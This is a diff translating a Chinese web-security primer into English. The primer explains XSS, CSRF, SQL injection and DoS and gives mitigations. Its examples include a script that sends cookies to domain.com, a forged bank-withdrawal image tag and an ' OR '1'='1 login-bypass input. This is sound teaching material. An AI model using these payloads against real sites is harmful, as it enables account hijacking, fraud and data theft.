@@ -1,11 +1,11 @@
 # Attack Techniques
 <!-- GFM-TOC -->
-* [攻击技术](#attack-techniques)
-    * [一、跨站脚本攻击](#1-cross-site-scripting)
-    * [二、跨站请求伪造](#2-cross-site-request-forgery)
-    * [三、SQL 注入攻击](#3-sql-injection)
-    * [四、拒绝服务攻击](#4-denial-of-service-attack)
-    * [参考资料](#references)
+* [Attack Techniques](#attack-techniques)
+    * [1. Cross-Site Scripting](#1-cross-site-scripting)
+    * [2. Cross-Site Request Forgery](#2-cross-site-request-forgery)
+    * [3. SQL Injection](#3-sql-injection)
+    * [4. Denial-of-Service Attack](#4-denial-of-service-attack)
+    * [References](#references)
 <!-- GFM-TOC -->
 
 
@@ -13,45 +13,45 @@
 
 ### Overview
 
-跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。
+Cross-Site Scripting (XSS) can inject code into web pages viewed by users. This code includes HTML and JavaScript.
 
 ### Attack Flow
 
-例如有一个论坛网站，攻击者可以在上面发布以下内容：
+For example, on a forum website, an attacker can post the following content:
 
 ```html
 <script>location.href="//domain.com/?c=" + document.cookie</script>
 ```
 
-之后该内容可能会被渲染成以下形式：
+The content may then be rendered as follows:
 
 ```html
 <p><script>location.href="//domain.com/?c=" + document.cookie</script></p>
 ```
 
-另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。
+Another user who views a page containing this content will be redirected to domain.com and carry the Cookie from the current scope. If the forum manages user login state through cookies, the attacker can use this cookie to log in to the victim's account.
 
 ### Impact
 
-- 窃取用户的 Cookie
-- 伪造虚假的输入表单骗取个人信息
-- 显示伪造的文章或者图片
+- Steal user cookies
+- Forge fake input forms to obtain personal information
+- Display fake articles or images
 
 ### Mitigation
 
 #### 1. Set Cookie to HttpOnly
 
-设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。
+Cookies with HttpOnly set cannot be accessed by JavaScript scripts, so user cookie information cannot be obtained through document.cookie.
 
 #### 2. Filter Special Characters
 
-例如将 `<` 转义为 `&lt;`，将 `>` 转义为 `&gt;`，从而避免 HTML 和 Jascript 代码的运行。
+For example, escape `<` as `&lt;` and `>` as `&gt;` to prevent HTML and JavaScript code from running.
 
-富文本编辑器允许用户输入 HTML 代码，就不能简单地将 `<` 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。
+Rich text editors allow users to enter HTML code, so characters such as `<` cannot simply be filtered, which greatly increases the possibility of XSS attacks.
 
-富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。
+Rich text editors usually use an XSS filter to defend against XSS attacks. They define tag allowlists or blocklists to prevent malicious HTML code from being entered.
 
-以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。
+In the following example, tags such as form and script are escaped, while tags such as h and p are preserved.
 
 ```html
 <h1 id="title">XSS Demo</h1>
@@ -85,80 +85,80 @@ alert(/xss/);
 &lt;/script&gt;
 ```
 
-> [XSS 过滤在线测试](http://jsxss.com/zh/try.html)
+> [Online XSS Filter Test](http://jsxss.com/zh/try.html)
 
 ## 2. Cross-Site Request Forgery
 
 ### Overview
 
-跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。
+Cross-Site Request Forgery (CSRF) is an attack where an attacker uses technical means to trick a user's browser into visiting a website where the user has previously authenticated and performing actions, such as sending emails, sending messages, or even financial operations such as transfers and purchases. Because the browser has already authenticated, the visited website treats the request as a real user operation and executes it.
 
-XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。
+XSS exploits the user's trust in a specific website, while CSRF exploits the website's trust in the user's browser.
 
 ### Attack Flow
 
-假如一家银行用以执行转账操作的 URL 地址如下：
+Suppose a bank uses the following URL to perform a transfer:
 
 ```
 http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName。
 ```
 
-那么，一个恶意攻击者可以在另一个网站上放置如下代码：
+Then a malicious attacker can place the following code on another website:
 
 ```
 <img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">。
 ```
 
-如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。
+If a user named Alice visits the malicious site, and she has recently visited the bank so her login information has not expired, she will lose 1000 dollars.
 
-这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。
+This malicious URL can take many forms and be hidden in many places on a web page. In addition, the attacker does not need to control the website where the malicious URL is placed. For example, the attacker can hide this address in forums, blogs, or any user-generated content site. This means that if the server side has no proper defense, users may be attacked even when visiting familiar and trusted websites.
 
-通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。
+The example shows that attackers cannot directly gain control of the user's account through CSRF, nor can they directly steal any user information. What they can do is trick the user's browser into performing operations in the user's name.
 
 ### Mitigation
 
 #### 1. Check the Referer Header
 
-Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。
+The Referer header field is in the HTTP message and identifies the source address of the request. Checking this header field and requiring the request source to be under the same domain can greatly prevent CSRF attacks.
 
-这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。
+This method is simple and easy, with low implementation effort. It only requires adding one validation step at critical access points. However, it also has limitations because it completely depends on the browser sending the correct Referer field. Although the HTTP protocol clearly specifies the content of this field, it cannot guarantee the implementation details of visiting browsers or guarantee that browser security vulnerabilities will not affect this field. Attackers may also attack certain browsers and tamper with their Referer fields.
 
 #### 2. Add Verification Token
 
-在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。
+When accessing sensitive data, require the user's browser to provide validation data that is not stored in a cookie and cannot be forged by an attacker. For example, the server can generate a random number, attach it to the form, and require the client to send it back.
 
 #### 3. Enter CAPTCHA
 
-因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。
+Because CSRF attacks occur without the user's awareness, requiring a CAPTCHA lets the user know that they are performing an operation.
 
 ## 3. SQL Injection
 
 ### Overview
 
-服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。
+The database on the server runs illegal SQL statements, usually caused by string concatenation.
 
 ### Attack Flow
 
-例如一个网站登录验证的 SQL 查询代码为：
+For example, the SQL query code for login validation on a website is:
 
 ```sql
 strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
 ```
 
-如果填入以下内容：
+If the following content is entered:
 
 ```sql
 userName = "1' OR '1'='1";
 passWord = "1' OR '1'='1";
 ```
 
-那么 SQL 查询字符串为：
+Then the SQL query string becomes:
 
 ```sql
 strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
 ```
 
-此时无需验证通过就能执行以下查询：
+At this point, the following query can be executed without passing authentication:
 
 ```sql
 strSQL = "SELECT * FROM users;"
@@ -168,7 +168,7 @@ strSQL = "SELECT * FROM users;"
 
 #### 1. Use Parameterized Queries
 
-Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。
+PreparedStatement in Java is a precompiled SQL statement. Appropriate parameters can be passed in and the statement can be executed multiple times. Because there is no concatenation process, it can prevent SQL injection.
 
 ```java
 PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE userid=? AND password=?");
@@ -179,17 +179,17 @@ ResultSet rs = stmt.executeQuery();
 
 #### 2. Single Quote Escaping
 
-将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。
+Convert single quotes in incoming parameters into two consecutive single quotes. Magic quote in PHP can perform this function.
 
 ## 4. Denial-of-Service Attack
 
-拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。
+A Denial-of-Service attack (DoS), also called a flood attack, aims to exhaust the target computer's network or system resources, causing the service to be temporarily interrupted or stopped and preventing normal users from accessing it.
 
-分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。
+A Distributed Denial-of-Service attack (DDoS) means that an attacker uses two or more compromised computers as bots to launch a denial-of-service attack against a specific target.
 
 ## References
 
-- [维基百科：跨站脚本](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC)
-- [维基百科：SQL 注入攻击](https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A)
-- [维基百科：跨站点请求伪造](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)
-- [维基百科：拒绝服务攻击](https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A)
+- [Wikipedia: Cross-Site Scripting](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC)
+- [Wikipedia: SQL Injection](https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A)
+- [Wikipedia: Cross-Site Request Forgery](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)
+- [Wikipedia: Denial-of-Service Attack](https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A)
